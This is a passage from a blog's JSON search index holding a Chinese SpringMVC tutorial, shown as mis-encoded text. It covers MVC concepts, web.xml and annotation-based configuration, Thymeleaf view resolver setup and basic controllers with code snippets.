å¼€å‘"],"categories":["å¼€å‘"]},{"title":"SpringMVC å­¦ä¹ ","path":"/2024/09/09/java/å¼€å‘/SpringMVC/","content":"æ²¡äº‹å¹²æˆ‘å°±å­¦å¼€å‘ï¼Œå˜¿å˜¿å˜¿ SpringMVC0x01 å›é¡¾MVC MVCæ˜¯æ¨¡å‹(Model)ã€è§†å›¾(View)ã€æ§åˆ¶å™¨(Controller)çš„ç®€å†™ï¼Œæ˜¯ä¸€ç§è½¯ä»¶è®¾è®¡è§„èŒƒã€‚ æ˜¯å°†ä¸šåŠ¡é€»è¾‘ã€æ•°æ®ã€æ˜¾ç¤ºåˆ†ç¦»çš„æ–¹æ³•æ¥ç»„ç»‡ä»£ç ã€‚ MVCä¸»è¦ä½œç”¨æ˜¯é™ä½äº†è§†å›¾ä¸ä¸šåŠ¡é€»è¾‘é—´çš„åŒå‘å¶åˆã€‚ MVCä¸æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼ŒMVCæ˜¯ä¸€ç§æ¶æ„æ¨¡å¼ã€‚å½“ç„¶ä¸åŒçš„MVCå­˜åœ¨å·®å¼‚ã€‚ Modelï¼ˆæ¨¡å‹ï¼‰ï¼šæ•°æ®æ¨¡å‹ï¼Œæä¾›è¦å±•ç¤ºçš„æ•°æ®ï¼Œå› æ­¤åŒ…å«æ•°æ®å’Œè¡Œä¸ºï¼Œå¯ä»¥è®¤ä¸ºæ˜¯é¢†åŸŸæ¨¡å‹æˆ–JavaBeanç»„ä»¶ï¼ˆåŒ…å«æ•°æ®å’Œè¡Œä¸ºï¼‰ï¼Œä¸è¿‡ç°åœ¨ä¸€èˆ¬éƒ½åˆ†ç¦»å¼€æ¥ï¼šValue Objectï¼ˆæ•°æ®Daoï¼‰ å’Œ æœåŠ¡å±‚ï¼ˆè¡Œä¸ºServiceï¼‰ã€‚ä¹Ÿå°±æ˜¯æ¨¡å‹æä¾›äº†æ¨¡å‹æ•°æ®æŸ¥è¯¢å’Œæ¨¡å‹æ•°æ®çš„çŠ¶æ€æ›´æ–°ç­‰åŠŸèƒ½ï¼ŒåŒ…æ‹¬æ•°æ®å’Œä¸šåŠ¡ã€‚ Viewï¼ˆè§†å›¾ï¼‰ï¼šè´Ÿè´£è¿›è¡Œæ¨¡å‹çš„å±•ç¤ºï¼Œä¸€èˆ¬å°±æ˜¯æˆ‘ä»¬è§åˆ°çš„ç”¨æˆ·ç•Œé¢ï¼Œå®¢æˆ·æƒ³çœ‹åˆ°çš„ä¸œè¥¿ã€‚ Controllerï¼ˆæ§åˆ¶å™¨ï¼‰ï¼šæ¥æ”¶ç”¨æˆ·è¯·æ±‚ï¼Œå§”æ‰˜ç»™æ¨¡å‹è¿›è¡Œå¤„ç†ï¼ˆçŠ¶æ€æ”¹å˜ï¼‰ï¼Œå¤„ç†å®Œæ¯•åæŠŠè¿”å›çš„æ¨¡å‹æ•°æ®è¿”å›ç»™è§†å›¾ï¼Œç”±è§†å›¾è´Ÿè´£å±•ç¤ºã€‚ ä¹Ÿå°±æ˜¯è¯´æ§åˆ¶å™¨åšäº†ä¸ªè°ƒåº¦å‘˜çš„å·¥ä½œã€‚ æœ€å…¸å‹çš„MVCå°±æ˜¯JSP + servlet + javabeançš„æ¨¡å¼ã€‚ Model1æ—¶ä»£ åœ¨webæ—©æœŸçš„å¼€å‘ä¸­ï¼Œé€šå¸¸é‡‡ç”¨çš„éƒ½æ˜¯Model1ã€‚ Model1ä¸­ï¼Œä¸»è¦åˆ†ä¸ºä¸¤å±‚ï¼Œè§†å›¾å±‚å’Œæ¨¡å‹å±‚ã€‚ Model1ä¼˜ç‚¹ï¼šæ¶æ„ç®€å•ï¼Œæ¯”è¾ƒé€‚åˆå°å‹é¡¹ç›®å¼€å‘ï¼› Model1ç¼ºç‚¹ï¼šJSPèŒè´£ä¸å•ä¸€ï¼ŒèŒè´£è¿‡é‡ï¼Œä¸ä¾¿äºç»´æŠ¤ï¼› Model2æ—¶ä»£Model2 æŠŠä¸€ä¸ªé¡¹ç›®åˆ†æˆä¸‰éƒ¨åˆ†ï¼ŒåŒ…æ‹¬è§†å›¾ã€æ§åˆ¶ã€æ¨¡å‹ã€‚ ç”¨æˆ·å‘è¯·æ±‚ Servletæ¥æ”¶è¯·æ±‚æ•°æ®ï¼Œå¹¶è°ƒç”¨å¯¹åº”çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³• ä¸šåŠ¡å¤„ç†å®Œæ¯•ï¼Œè¿”å›æ›´æ–°åçš„æ•°æ®ç»™servlet servletè½¬å‘åˆ°JSPï¼Œç”±JSPæ¥æ¸²æŸ“é¡µé¢ å“åº”ç»™å‰ç«¯æ›´æ–°åçš„é¡µé¢ èŒè´£åˆ†æï¼š Controllerï¼šæ§åˆ¶å™¨ å–å¾—è¡¨å•æ•°æ® è°ƒç”¨ä¸šåŠ¡é€»è¾‘ è½¬å‘æŒ‡å®šçš„é¡µé¢ Modelï¼šæ¨¡å‹ ä¸šåŠ¡é€»è¾‘ ä¿å­˜æ•°æ®çš„çŠ¶æ€ Viewï¼šè§†å›¾ æ˜¾ç¤ºé¡µé¢ Model2è¿™æ ·ä¸ä»…æé«˜çš„ä»£ç çš„å¤ç”¨ç‡ä¸é¡¹ç›®çš„æ‰©å±•æ€§ï¼Œä¸”å¤§å¤§é™ä½äº†é¡¹ç›®çš„ç»´æŠ¤æˆæœ¬ã€‚Model 1æ¨¡å¼çš„å®ç°æ¯”è¾ƒç®€å•ï¼Œé€‚ç”¨äºå¿«é€Ÿå¼€å‘å°è§„æ¨¡é¡¹ç›®ï¼ŒModel1ä¸­JSPé¡µé¢èº«å…¼Viewå’ŒControllerä¸¤ç§è§’è‰²ï¼Œå°†æ§åˆ¶é€»è¾‘å’Œè¡¨ç°é€»è¾‘æ··æ‚åœ¨ä¸€èµ·ï¼Œä»è€Œå¯¼è‡´ä»£ç çš„é‡ç”¨æ€§éå¸¸ä½ï¼Œå¢åŠ äº†åº”ç”¨çš„æ‰©å±•æ€§å’Œç»´æŠ¤çš„éš¾åº¦ã€‚Model2æ¶ˆé™¤äº†Model1çš„ç¼ºç‚¹ã€‚ MVCæ¡†æ¶è¦åšå“ªäº›äº‹æƒ… å°†urlæ˜ å°„åˆ°javaç±»æˆ–javaç±»çš„æ–¹æ³• . å°è£…ç”¨æˆ·æäº¤çš„æ•°æ® . å¤„ç†è¯·æ±‚â€”è°ƒç”¨ç›¸å…³çš„ä¸šåŠ¡å¤„ç†â€”å°è£…å“åº”æ•°æ® . å°†å“åº”çš„æ•°æ®è¿›è¡Œæ¸²æŸ“ . jsp &#x2F; html ç­‰è¡¨ç¤ºå±‚æ•°æ® . è¯´æ˜ï¼š å¸¸è§çš„æœåŠ¡å™¨ç«¯MVCæ¡†æ¶æœ‰ï¼šStrutsã€Spring MVCã€ASP.NET MVCã€Zend Frameworkã€JSFï¼›å¸¸è§å‰ç«¯MVCæ¡†æ¶ï¼švueã€angularjsã€reactã€backboneï¼›ç”±MVCæ¼”åŒ–å‡ºäº†å¦å¤–ä¸€äº›æ¨¡å¼å¦‚ï¼šMVPã€MVVM ç­‰ç­‰â€¦. 0x02 é…ç½®ç¯å¢ƒå¹¶æ­å»ºé¡¹ç›®è¿™é‡Œæˆ‘ä»¬ç»§ç»­ä½¿ç”¨ä¹‹å‰çš„Tomcat10æœåŠ¡å™¨ï¼ŒSpring6ä¹‹åè¦æ±‚å¿…é¡»ä½¿ç”¨Tomcat10æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œè·Ÿä¹‹å‰ä¸€æ ·ï¼Œæˆ‘ä»¬ç›´æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„JakartaEEé¡¹ç›®,java8 ä¹Ÿå¯ä»¥ï¼Œä¸è¿‡éƒ½ spring6 äº†è¿˜æ˜¯ä½“éªŒä¸€ä¸‹ java17 å§ã€‚ ä¼ ç»ŸXMLé…ç½®å½¢å¼SpringMvcé¡¹ç›®ä¾ç„¶æ”¯æŒå¤šç§é…ç½®å½¢å¼ï¼Œè¿™é‡Œæˆ‘ä»¬é¦–å…ˆè®²è§£æœ€ä¼ ç»Ÿçš„XMLé…ç½®å½¢å¼ã€‚ é¦–å…ˆæˆ‘ä»¬éœ€è¦æ·»åŠ Mvcç›¸å…³ä¾èµ–ï¼š 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;6.0.10&lt;/version&gt;&lt;/dependency&gt; æ¥ç€æˆ‘ä»¬éœ€è¦é…ç½®ä¸€ä¸‹web.xmlï¼Œå°†DispatcherServletæ›¿æ¢æ‰Tomcatè‡ªå¸¦çš„Servletï¼Œè¿™é‡Œurl-patternéœ€è¦å†™ä¸º/ï¼Œå³å¯å®Œæˆæ›¿æ¢ï¼š 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;https://jakarta.ee/xml/ns/jakartaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;https://jakarta.ee/xml/ns/jakartaee https://jakarta.ee/xml/ns/jakartaee/web-app_5_0.xsd&quot; version=&quot;5.0&quot;&gt; &lt;servlet&gt; &lt;servlet-name&gt;mvc&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;mvc&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; æ¥ç€éœ€è¦ä¸ºæ•´ä¸ªWebåº”ç”¨ç¨‹åºé…ç½®ä¸€ä¸ªSpringä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆä¹Ÿå°±æ˜¯å®¹å™¨ï¼‰ï¼Œå› ä¸ºSpringMVCæ˜¯åŸºäºSpringå¼€å‘çš„ï¼Œå®ƒç›´æ¥åˆ©ç”¨Springæä¾›çš„å®¹å™¨æ¥å®ç°å„ç§åŠŸèƒ½ï¼Œé‚£ä¹ˆç¬¬ä¸€æ­¥ä¾ç„¶è·Ÿä¹‹å‰ä¸€æ ·ï¼Œéœ€è¦ç¼–å†™ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼š 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;&lt;/beans&gt; æ¥ç€æˆ‘ä»¬éœ€è¦ä¸ºDispatcherServleté…ç½®ä¸€äº›åˆå§‹åŒ–å‚æ•°æ¥æŒ‡å®šåˆšåˆšåˆ›å»ºçš„é…ç½®æ–‡ä»¶ï¼š 123456789&lt;servlet&gt; &lt;servlet-name&gt;mvc&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;!-- æŒ‡å®šæˆ‘ä»¬åˆšåˆšåˆ›å»ºåœ¨ç±»è·¯å¾„ä¸‹çš„XMLé…ç½®æ–‡ä»¶ --&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:application.xml&lt;/param-value&gt; &lt;/init-param&gt;&lt;/servlet&gt; è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†åŸºæœ¬çš„é…ç½®ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥æ¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦é…ç½®æ­£ç¡®ï¼Œæˆ‘ä»¬åˆ é™¤é¡¹ç›®è‡ªå¸¦çš„Servletç±»ï¼Œåˆ›å»ºä¸€ä¸ªMvcä¸­ä½¿ç”¨çš„Controllerç±»ï¼Œç°åœ¨è¿˜æ²¡å­¦æ²¡å…³ç³»ï¼Œè·Ÿç€å†™å°±è¡Œäº†ï¼Œè¿™é‡Œæˆ‘ä»¬åªæ˜¯æµ‹è¯•ä¸€ä¸‹ï¼š 12345678@Controllerpublic class HelloController &#123; @ResponseBody @RequestMapping(&quot;/&quot;) public String hello()&#123; return &quot;HelloWorld!&quot;; &#125;&#125; æ¥ç€æˆ‘ä»¬éœ€è¦å°†è¿™ä¸ªç±»æ³¨å†Œä¸ºBeanæ‰èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œæˆ‘ä»¬æ¥ç¼–å†™ä¸€ä¸‹Springçš„é…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥é…ç½®åŒ…æ‰«æï¼ŒXMLä¸‹çš„åŒ…æ‰«æéœ€è¦è¿™æ ·å¼€å¯ï¼š 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt; &lt;!-- éœ€è¦å…ˆå¼•å…¥contextå‘½åç©ºé—´ï¼Œç„¶åç›´æ¥é…ç½®base-packageå±æ€§å°±å¯ä»¥äº† --&gt; &lt;context:component-scan base-package=&quot;com.example&quot;/&gt;&lt;/beans&gt; å¦‚æœå¯ä»¥æˆåŠŸåœ¨æµè§ˆå™¨ä¸­å‡ºç°HelloWorldåˆ™è¯´æ˜é…ç½®æˆåŠŸ(è®°å¾—æŠŠ index.jsp åˆ æ‰)ï¼š å…¨æ³¨è§£é…ç½®å½¢å¼å¦‚æœä½ å¸Œæœ›å®Œå®Œå…¨å…¨ä¸¢å¼ƒé…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨çº¯æ³¨è§£å¼€å‘ï¼Œå¯ä»¥ç›´æ¥æ·»åŠ ä¸€ä¸ªç±»ï¼ŒTomcatä¼šåœ¨ç±»è·¯å¾„ä¸­æŸ¥æ‰¾å®ç°ServletContainerInitializer æ¥å£çš„ç±»ï¼Œå¦‚æœå‘ç°çš„è¯ï¼Œå°±ç”¨å®ƒæ¥é…ç½®Servletå®¹å™¨ï¼ŒSpringæä¾›äº†è¿™ä¸ªæ¥å£çš„å®ç°ç±» SpringServletContainerInitializer , é€šè¿‡@HandlesTypes(WebApplicationInitializer.class)è®¾ç½®ï¼Œè¿™ä¸ªç±»åè¿‡æ¥ä¼šæŸ¥æ‰¾å®ç°WebApplicationInitializer çš„ç±»ï¼Œå¹¶å°†é…ç½®çš„ä»»åŠ¡äº¤ç»™ä»–ä»¬æ¥å®Œæˆï¼Œå› æ­¤ç›´æ¥å®ç°æ¥å£å³å¯ï¼š 1234567891011121314151617public class MainInitializer extends AbstractAnnotationConfigDispatcherServletInitializer &#123; @Override protected Class&lt;?&gt;[] getRootConfigClasses() &#123; return new Class[]&#123;WebConfiguration.class&#125;; //åŸºæœ¬çš„Springé…ç½®ç±»ï¼Œä¸€èˆ¬ç”¨äºä¸šåŠ¡å±‚é…ç½® &#125; @Override protected Class&lt;?&gt;[] getServletConfigClasses() &#123; return new Class[0]; //é…ç½®DispatcherServletçš„é…ç½®ç±»ã€ä¸»è¦ç”¨äºControllerç­‰é…ç½®ï¼Œè¿™é‡Œä¸ºäº†æ•™å­¦ç®€å•ï¼Œå°±ä¸åˆ†è¿™ä¹ˆè¯¦ç»†äº†ï¼Œåªä½¿ç”¨ä¸Šé¢çš„åŸºæœ¬é…ç½®ç±» &#125; @Override protected String[] getServletMappings() &#123; return new String[]&#123;&quot;/&quot;&#125;; //åŒ¹é…è·¯å¾„ï¼Œä¸ä¸Šé¢ä¸€è‡´ &#125;&#125; æ¥ç€æˆ‘ä»¬éœ€è¦å†é…ç½®ç±»ä¸­æ·»åŠ ä¸€äº›å¿…è¦çš„æ³¨è§£ï¼š 12345@Configuration@EnableWebMvc //å¿«é€Ÿé…ç½®SpringMvcæ³¨è§£ï¼Œå¦‚æœä¸æ·»åŠ æ­¤æ³¨è§£ä¼šå¯¼è‡´åç»­æ— æ³•é€šè¿‡å®ç°WebMvcConfigureræ¥å£è¿›è¡Œè‡ªå®šä¹‰é…ç½®@ComponentScan(&quot;com.shellf.controller&quot;)public class WebConfiguration &#123;&#125; è¿™æ ·æˆ‘ä»¬åŒæ ·å¯ä»¥æ­£å¸¸è®¿é—®ï¼š ä¹‹åä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬å°±ç»Ÿä¸€ä½¿ç”¨å…¨æ³¨è§£å½¢å¼ç¼–å†™ã€‚ 0x03 Controlleræ§åˆ¶å™¨æœ‰äº† SpringMVC ä¹‹åï¼Œæˆ‘ä»¬ä¸å¿…å†åƒä¹‹å‰é‚£æ ·ä¸€ä¸ªè¯·æ±‚åœ°å€åˆ›å»ºä¸€ä¸ª Servlet äº†ï¼Œå®ƒä½¿ç”¨ DispatcherServlet æ›¿ä»£ Tomcat ä¸ºæˆ‘ä»¬æä¾›çš„é»˜è®¤çš„é™æ€èµ„æº Servletï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç°åœ¨æ‰€æœ‰çš„è¯·æ±‚ï¼ˆé™¤äº†jspï¼Œå› ä¸ºTomcatè¿˜æä¾›äº†ä¸€ä¸ªjspçš„Servletï¼‰éƒ½ä¼šç»è¿‡DispatcherServletè¿›è¡Œå¤„ç†ã€‚ é‚£ä¹ˆDispatcherServletä¼šå¸®åŠ©æˆ‘ä»¬åšä»€ä¹ˆå‘¢ï¼Ÿ æ ¹æ®å›¾ç‰‡æˆ‘ä»¬å¯ä»¥äº†è§£ï¼Œæˆ‘ä»¬çš„è¯·æ±‚åˆ°è¾¾TomcatæœåŠ¡å™¨ä¹‹åï¼Œä¼šäº¤ç»™å½“å‰çš„Webåº”ç”¨ç¨‹åºè¿›è¡Œå¤„ç†ï¼Œè€Œ SpringMVC ä½¿ç”¨DispatcherServletæ¥å¤„ç†æ‰€æœ‰çš„è¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒè¢«ä½œä¸ºä¸€ä¸ªç»Ÿä¸€çš„è®¿é—®ç‚¹ï¼Œæ‰€æœ‰çš„è¯·æ±‚å…¨éƒ¨ç”±å®ƒæ¥è¿›è¡Œè°ƒåº¦ã€‚ å½“ä¸€ä¸ªè¯·æ±‚ç»è¿‡DispatcherServletä¹‹åï¼Œä¼šå…ˆèµ°HandlerMappingï¼Œå®ƒä¼šå°†è¯·æ±‚æ˜ å°„ä¸ºHandlerExecutionChainï¼Œä¾æ¬¡ç»è¿‡HandlerInterceptoræœ‰ç‚¹ç±»ä¼¼äºä¹‹å‰æˆ‘ä»¬æ‰€å­¦çš„è¿‡æ»¤å™¨ï¼Œä¸è¿‡åœ¨SpringMVCä¸­æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯æ‹¦æˆªå™¨ï¼Œç„¶åå†äº¤ç»™HandlerAdapterï¼Œæ ¹æ®è¯·æ±‚çš„è·¯å¾„é€‰æ‹©åˆé€‚çš„æ§åˆ¶å™¨è¿›è¡Œå¤„ç†ï¼Œæ§åˆ¶å™¨å¤„ç†å®Œæˆä¹‹åï¼Œä¼šè¿”å›ä¸€ä¸ªModelAndViewå¯¹è±¡ï¼ŒåŒ…æ‹¬æ•°æ®æ¨¡å‹å’Œè§†å›¾ï¼Œé€šä¿—çš„è®²å°±æ˜¯é¡µé¢ä¸­æ•°æ®å’Œé¡µé¢æœ¬èº«ï¼ˆåªåŒ…å«è§†å›¾åç§°å³å¯ï¼‰ã€‚ è¿”å›ModelAndViewä¹‹åï¼Œä¼šäº¤ç»™ViewResolverï¼ˆè§†å›¾è§£æå™¨ï¼‰è¿›è¡Œå¤„ç†ï¼Œè§†å›¾è§£æå™¨ä¼šå¯¹æ•´ä¸ªè§†å›¾é¡µé¢è¿›è¡Œè§£æï¼ŒSpringMVCè‡ªå¸¦äº†ä¸€äº›è§†å›¾è§£æå™¨ï¼Œä½†æ˜¯åªé€‚ç”¨äºJSPé¡µé¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åƒä¹‹å‰ä¸€æ ·ä½¿ç”¨Thymeleafä½œä¸ºè§†å›¾è§£æå™¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ ¹æ®ç»™å®šçš„è§†å›¾åç§°ï¼Œç›´æ¥è¯»å–HTMLç¼–å†™çš„é¡µé¢ï¼Œè§£æä¸ºä¸€ä¸ªçœŸæ­£çš„Viewã€‚ è§£æå®Œæˆåï¼Œå°±éœ€è¦å°†é¡µé¢ä¸­çš„æ•°æ®å…¨éƒ¨æ¸²æŸ“åˆ°Viewä¸­ï¼Œæœ€åè¿”å›ç»™DispatcherServletä¸€ä¸ªåŒ…å«æ‰€æœ‰æ•°æ®çš„æˆå½¢é¡µé¢ï¼Œå†å“åº”ç»™æµè§ˆå™¨ï¼Œå®Œæˆæ•´ä¸ªè¿‡ç¨‹ã€‚ å› æ­¤ï¼Œå®é™…ä¸Šæ•´ä¸ªè¿‡ç¨‹æˆ‘ä»¬åªéœ€è¦ç¼–å†™å¯¹åº”è¯·æ±‚è·¯å¾„çš„çš„Controllerä»¥åŠé…ç½®å¥½æˆ‘ä»¬éœ€è¦çš„ViewResolverå³å¯ï¼Œä¹‹åè¿˜å¯ä»¥ç»§ç»­è¡¥å……æ·»åŠ æ‹¦æˆªå™¨ï¼Œè€Œå…¶ä»–çš„æµç¨‹å·²ç»ç”±SpringMVCå¸®åŠ©æˆ‘ä»¬å®Œæˆäº†ã€‚ é…ç½®è§†å›¾è§£æå™¨å’Œæ§åˆ¶å™¨é¦–å…ˆæˆ‘ä»¬éœ€è¦å®ç°æœ€åŸºæœ¬çš„é¡µé¢è§£æå¹¶è¿”å›ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯é…ç½®è§†å›¾è§£æå™¨ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨Thymeleafä¸ºæˆ‘ä»¬æä¾›çš„è§†å›¾è§£æå™¨ï¼Œå¯¼å…¥éœ€è¦çš„ä¾èµ–ï¼š 12345&lt;dependency&gt; &lt;groupId&gt;org.thymeleaf&lt;/groupId&gt; &lt;artifactId&gt;thymeleaf-spring6&lt;/artifactId&gt; &lt;version&gt;3.1.1.RELEASE&lt;/version&gt;&lt;/dependency&gt; é…ç½®è§†å›¾è§£æå™¨éå¸¸ç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦å°†å¯¹åº”çš„ViewResolveræ³¨å†Œä¸ºBeanå³å¯ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥åœ¨é…ç½®ç±»ä¸­ç¼–å†™ï¼š 123456789101112131415161718192021222324252627282930313233//å¿«é€Ÿé…ç½®SpringMvcæ³¨è§£ï¼Œå¦‚æœä¸æ·»åŠ æ­¤æ³¨è§£ä¼šå¯¼è‡´åç»­æ— æ³•é€šè¿‡å®ç°WebMvcConfigureræ¥å£è¿›è¡Œè‡ªå®šä¹‰é…ç½®@ComponentScan(&quot;com.she11f.controller&quot;)@Configuration@EnableWebMvc@ComponentScan(&quot;com.she11f.controller&quot;)public class WebConfiguration &#123; //æˆ‘ä»¬éœ€è¦ä½¿ç”¨ThymeleafViewResolverä½œä¸ºè§†å›¾è§£æå™¨ï¼Œå¹¶è§£ææˆ‘ä»¬çš„HTMLé¡µé¢ @Bean public ThymeleafViewResolver thymeleafViewResolver(SpringTemplateEngine springTemplateEngine)&#123; ThymeleafViewResolver resolver = new ThymeleafViewResolver(); resolver.setOrder(1); //å¯ä»¥å­˜åœ¨å¤šä¸ªè§†å›¾è§£æå™¨ï¼Œå¹¶ä¸”å¯ä»¥ä¸ºä»–ä»¬è®¾å®šè§£æé¡ºåº resolver.setCharacterEncoding(&quot;UTF-8&quot;); //ç¼–ç æ ¼å¼æ˜¯é‡ä¸­ä¹‹é‡ resolver.setTemplateEngine(springTemplateEngine); //å’Œä¹‹å‰JavaWebé˜¶æ®µä¸€æ ·ï¼Œéœ€è¦ä½¿ç”¨æ¨¡æ¿å¼•æ“è¿›è¡Œè§£æï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿéœ€è¦è®¾å®šä¸€ä¸‹æ¨¡æ¿å¼•æ“ return resolver; &#125; //é…ç½®æ¨¡æ¿è§£æå™¨ @Bean public SpringResourceTemplateResolver templateResolver()&#123; SpringResourceTemplateResolver resolver = new SpringResourceTemplateResolver(); resolver.setSuffix(&quot;.html&quot;); //éœ€è¦è§£æçš„åç¼€åç§° resolver.setPrefix(&quot;/&quot;); //éœ€è¦è§£æçš„HTMLé¡µé¢æ–‡ä»¶å­˜æ”¾çš„ä½ç½®ï¼Œé»˜è®¤æ˜¯webappç›®å½•ä¸‹ï¼Œå¦‚æœæ˜¯ç±»è·¯å¾„ä¸‹éœ€è¦æ·»åŠ classpath:å‰ç¼€ return resolver; &#125; //é…ç½®æ¨¡æ¿å¼•æ“Bean @Bean public SpringTemplateEngine springTemplateEngine(ITemplateResolver resolver)&#123; SpringTemplateEngine engine = new SpringTemplateEngine(); engine.setTemplateResolver(resolver); //æ¨¡æ¿è§£æå™¨ï¼Œé»˜è®¤å³å¯ return engine; &#125;&#125; ç°åœ¨æˆ‘ä»¬å°±å®Œæˆäº†è§†å›¾è§£æå™¨çš„é…ç½®ï¼Œæˆ‘ä»¬æ¥ç€æ¥åˆ›å»ºä¸€ä¸ªControllerï¼Œåˆ›å»ºControllerä¹Ÿéå¸¸ç®€å•ï¼Œåªéœ€åœ¨ä¸€ä¸ªç±»ä¸Šæ·»åŠ ä¸€ä¸ª@Controlleræ³¨è§£å³å¯ï¼Œå®ƒä¼šè¢«Springæ‰«æå¹¶è‡ªåŠ¨æ³¨å†Œä¸ºControllerç±»å‹çš„Beanï¼Œç„¶åæˆ‘ä»¬åªéœ€è¦åœ¨ç±»ä¸­ç¼–å†™æ–¹æ³•ç”¨äºå¤„ç†å¯¹åº”åœ°å€çš„è¯·æ±‚å³å¯ï¼š 123456789@Controller //ç›´æ¥æ·»åŠ æ³¨è§£å³å¯public class HelloController &#123; @RequestMapping(&quot;/index&quot;) //ç›´æ¥å¡«å†™è®¿é—®è·¯å¾„ public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;); //è¿”å›ModelAndViewå¯¹è±¡ï¼Œè¿™é‡Œå¡«å…¥äº†è§†å›¾çš„åç§° //è¿”å›åä¼šç»è¿‡è§†å›¾è§£æå™¨è¿›è¡Œå¤„ç† &#125;&#125; æ¥ç€æˆ‘ä»¬åœ¨ç±»è·¯å¾„æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªç®€å•htmlæ–‡ä»¶ï¼š 12345678910&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;æµ‹è¯•&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;æ¬¢è¿æ¥åˆ°GayHubå…¨çƒæœ€å¤§åŒæ€§äº¤å‹ç½‘ç«™&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; æˆ‘ä»¬ä¼šå‘ç°ï¼Œæ‰“å¼€æµè§ˆå™¨ä¹‹åå°±å¯ä»¥ç›´æ¥è®¿é—®æˆ‘ä»¬çš„HTMLé¡µé¢äº† å¦‚æœä¹±ç äº†ï¼Œåœ¨SpringResourceTemplateResolverè¿™ä¸ªbeanä¸­ï¼Œæ·»åŠ ä¸‰è¡Œset 123resolver.setTemplateMode(&quot;HTML5&quot;);resolver.setCacheable(false);resolver.setCharacterEncoding(&quot;utf-8&quot;); æˆ‘ä»¬åœ¨ä¹‹å‰ï¼Œä½¿ç”¨Thymeleafè§£æåç«¯çš„ä¸€äº›æ•°æ®æ—¶ï¼Œéœ€è¦é€šè¿‡Contextè¿›è¡Œä¼ é€’ï¼Œè€Œä½¿ç”¨SpringMvcåï¼Œæ•°æ®æˆ‘ä»¬å¯ä»¥ç›´æ¥å‘Modelæ¨¡å‹å±‚è¿›è¡Œæä¾›ï¼š 123456@RequestMapping(value = &quot;/index&quot;)public ModelAndView index()&#123; ModelAndView modelAndView = new ModelAndView(&quot;index&quot;); modelAndView.getModel().put(&quot;name&quot;, &quot;å•Šè¿™&quot;); //å°†nameä¼ é€’ç»™Model return modelAndView;&#125; @RequestMappingè¯¦è§£å‰é¢æˆ‘ä»¬å·²ç»äº†è§£äº†å¦‚ä½•åˆ›å»ºä¸€ä¸ªæ§åˆ¶å™¨æ¥å¤„ç†æˆ‘ä»¬çš„è¯·æ±‚ï¼Œæ¥ç€æˆ‘ä»¬åªéœ€è¦åœ¨æ§åˆ¶å™¨æ·»åŠ ä¸€ä¸ªæ–¹æ³•ç”¨äºå¤„ç†å¯¹åº”çš„è¯·æ±‚å³å¯ï¼Œä¹‹å‰æˆ‘ä»¬éœ€è¦å®Œæ•´åœ°ç¼–å†™ä¸€ä¸ªServletæ¥å®ç°ï¼Œè€Œç°åœ¨æˆ‘ä»¬åªéœ€è¦æ·»åŠ 